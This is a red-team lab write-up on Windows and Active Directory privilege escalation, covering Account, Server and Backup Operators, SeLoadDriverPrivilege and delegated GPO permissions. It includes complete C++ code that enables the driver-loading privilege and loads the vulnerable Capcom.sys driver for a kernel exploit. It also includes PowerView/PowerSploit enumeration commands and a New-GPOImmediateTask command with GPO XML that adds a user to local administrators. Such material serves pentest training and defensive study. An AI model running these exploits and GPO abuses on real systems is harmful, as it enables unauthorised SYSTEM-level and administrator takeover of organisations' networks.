# Privileged Accounts and Token Privileges

Administrators, Domain Admins, Enterprise Admins are well known AD groups that allow for privilege escalation, that pentesters and red teamers will aim for in their engagements, but there are other account memberships and access token privileges that can also be useful during security assesments when chaining multiple attack vectors.

## Account Operators

* Allows creating non administrator accounts and groups on the domain
* Allows logging in to the DC locally

Note the spotless' user membership:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-01-38.png)

However, we can still add new users:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-01-47.png)

As well as login to DC01 locally:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-05-35.png)

## Server Operators

This membership allows users to configure Domain Controllers with the following privileges:

* Allow log on locally
* Back up files and directories
* Change the system time
* Change the time zone
* Force shutdown from a remote system
* Restore files and directories
* Shut down the system

Note how we cannot access files on the DC with current membership:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-38-43.png)

However, if the user belongs to `Server Operators`:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-38-58.png)

The story changes:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-39-08.png)

## Backup Operators

As with `Server Operators` membership, we can access the `DC01` file system if we belong to `Backup Operators`:

![](../../.gitbook/assets/screenshot-from-2018-12-17-17-42-47.png)

## SeLoadDriverPrivilege

A very dangerous privilege to assign to any user - it allows the user to load kernel drivers and execute code with kernel privilges aka `NT\System`. See how `offense\spotless` user has this privilege:

![](../../.gitbook/assets/screenshot-from-2018-12-17-22-40-30.png)

`Whoami /priv` shows the privilege is disabled by default:

![](../../.gitbook/assets/screenshot-from-2018-12-17-21-59-15.png)

However, the below code allows enabling that privilege fairly easily:

{% code title="privileges.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	system("cmd");
    return 0;
}
```
{% endcode %}

We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:

![](../../.gitbook/assets/screenshot-from-2018-12-17-22-45-54.png)

### Capcom.sys Driver Exploit

To further prove the `SeLoadDriverPrivilege` is dangerous, let's exploit it to elevate privileges.

Let's build on the previous code and leverage the Win32 API call `ntdll.NtLoadDriver()` to load the malicious kernel driver `Capcom.sys`. Note that lines 55 and 56 of the `privileges.cpp` are:

```cpp
PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
```

The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\) when executing the exploit:

{% code title="privileges.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <ntsecapi.h>
#include <stdlib.h>
#include <locale.h>
#include <iostream>
#include "stdafx.h"

NTSTATUS(NTAPI *NtLoadDriver)(IN PUNICODE_STRING DriverServiceName);
VOID(NTAPI *RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
NTSTATUS(NTAPI *NtUnloadDriver)(IN PUNICODE_STRING DriverServiceName);

int main()
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	bool bEnablePrivilege(true);
	HANDLE hToken(NULL);
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		L"SeLoadDriverPrivilege",   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("LookupPrivilegeValue error: %un", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege) {
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	}
	
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %x", GetLastError());
		return FALSE;
	}

	//system("cmd");
	// below code for loading drivers is taken from https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/RDI/dll/NtLoadDriver.h
	std::cout << "[+] Set Registry Keys" << std::endl;
	NTSTATUS st1;
	UNICODE_STRING pPath;
	UNICODE_STRING pPathReg;
	PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
	PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
	const char NTDLL[] = { 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c, 0x00 };
	HMODULE hObsolete = GetModuleHandleA(NTDLL);
	*(FARPROC *)&RtlInitUnicodeString = GetProcAddress(hObsolete, "RtlInitUnicodeString");
	*(FARPROC *)&NtLoadDriver = GetProcAddress(hObsolete, "NtLoadDriver");
	*(FARPROC *)&NtUnloadDriver = GetProcAddress(hObsolete, "NtUnloadDriver");

	RtlInitUnicodeString(&pPath, pPathSource);
	RtlInitUnicodeString(&pPathReg, pPathSourceReg);
	st1 = NtLoadDriver(&pPathReg);
	std::cout << "[+] value of st1: " << st1 << "\n";
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver Loaded as Kernel..\n";
		std::cout << "[+] Press [ENTER] to unload driver\n";
	}

	getchar();
	st1 = NtUnloadDriver(&pPathReg);
	if (st1 == ERROR_SUCCESS) {
		std::cout << "[+] Driver unloaded from Kernel..\n";
		std::cout << "[+] Press [ENTER] to exit\n";
		getchar();
	}

    return 0;
}
```
{% endcode %}

Once the above code is compiled and executed, we can see that our malicious `Capcom.sys` driver gets loaded onto the victim system:

![](../../.gitbook/assets/screenshot-from-2018-12-17-22-14-26%20%281%29.png)

{% file src="../../.gitbook/assets/capcom.sys" caption="Capcom.sys" %}

We can now download and compile the Capcom exploit from [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom) and execute it on the system to elevate our privileges to `NT Authority\System`:

![](../../.gitbook/assets/screenshot-from-2018-12-17-23-40-56.png)

## GPO Delegation

Sometimes, certain users/groups may be delegated access to manage Group Policy Objects as is the case with `offense\spotless` user:

![](../../.gitbook/assets/screenshot-from-2018-12-18-14-58-34.png)

We can see this by leveraging PowerView like so:

{% code title="attacker@victim" %}
```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```
{% endcode %}

The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:

![](../../.gitbook/assets/screenshot-from-2018-12-18-14-57-21.png)

More about general AD ACL/ACE abuse refer to the lab:

{% page-ref page="abusing-active-directory-acls-aces.md" %}

### Abusing the GPO Permissions

We know the above ObjectDN from the above screenshot is referring to the `New Group Policy Object` GPO since the ObjectDN points to `CN=Policies` and also the `CN={DDC640FF-634A-4442-BC2E-C05EED132F0C}` which is the same in the GPO settings as highlighted below:

![](../../.gitbook/assets/screenshot-from-2018-12-18-15-05-25.png)

If we want to search for misconfigured GPOs specifically, we can chain multiple cmdlets from PowerSploit like so:

```csharp
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-12-20-11-41-55.png)

#### Computers with a Given Policy Applied

We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:

```csharp
Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
```

![ws01.offense.local has &quot;Misconfigured Policy&quot; applied to it](../../.gitbook/assets/screenshot-from-2018-12-20-11-42-04.png)

#### Policies Applied to a Given Computer

```csharp
Get-DomainGPO -ComputerIdentity ws01 -Properties Name, DisplayName
```

![](../../.gitbook/assets/screenshot-from-2019-01-16-19-44-19.png)

#### OUs with a Given Policy Applied

```csharp
Get-DomainOU -GPLink "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" -Properties DistinguishedName
```

![](../../.gitbook/assets/screenshot-from-2019-01-16-19-46-33.png)

#### Abusing Weak GPO Permissions

One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:

```csharp
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

![](../../.gitbook/assets/screenshot-from-2018-12-20-13-43-46.png)

The above will add our user spotless to the local `administrators` group of the compromised box. Note how prior to the code execution the group does not contain user `spotless`:

![](../../.gitbook/assets/screenshot-from-2018-12-20-13-40-11.png)

### Force Policy Update

ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:

![](../../.gitbook/assets/screenshot-from-2018-12-20-13-45-18.png)

### Under the hood

If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:

![](../../.gitbook/assets/screenshot-from-2018-12-20-12-02-22.png)

Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:

{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
    <ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="evilTask" image="0" changed="2018-11-20 13:43:43" uid="{6cc57eac-b758-4c52-825d-e21480bbb47f}" userContext="0" removePolicy="0">
        <Properties action="C" name="evilTask" runAs="NT AUTHORITY\System" logonType="S4U">
            <Task version="1.3">
                <RegistrationInfo>
                    <Author>NT AUTHORITY\System</Author>
                    <Description></Description>
                </RegistrationInfo>
                <Principals>
                    <Principal id="Author">
                        <UserId>NT AUTHORITY\System</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                        <LogonType>S4U</LogonType>
                    </Principal>
                </Principals>
                <Settings>
                    <IdleSettings>
                        <Duration>PT10M</Duration>
                        <WaitTimeout>PT1H</WaitTimeout>
                        <StopOnIdleEnd>true</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <AllowStartOnDemand>false</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                    <DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>
                    <RestartOnFailure>
                        <Interval>PT15M</Interval>
                        <Count>3</Count>
                    </RestartOnFailure>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>cmd</Command>
                        <Arguments>/c net localgroup administrators spotless /add</Arguments>
                    </Exec>
                </Actions>
                <Triggers>
                    <TimeTrigger>
                        <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
                        <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
                        <Enabled>true</Enabled>
                    </TimeTrigger>
                </Triggers>
            </Task>
        </Properties>
    </ImmediateTaskV2>
</ScheduledTasks>
```
{% endcode %}

### Users and Groups

The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:

{% code title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
```markup
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
    <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2018-12-20 14:08:39" uid="{300BCC33-237E-4FBA-8E4D-D8C3BE2BB836}">
        <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
            <Members>
                <Member name="spotless" action="ADD" sid="" />
            </Members>
        </Properties>
    </Group>
</Groups>
```
{% endcode %}

Additionally, we could think about leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.

## References

{% embed url="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/" %}

{% embed url="https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/" %}

{% embed url="https://rastamouse.me/2019/01/gpo-abuse-part-1/" %}

{% embed url="https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp\#L13" %}

{% embed url="https://github.com/tandasat/ExploitCapcom" %}

{% embed url="https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp" %}

{% embed url="https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys" %}

{% embed url="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e" %}

{% embed url="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html" %}

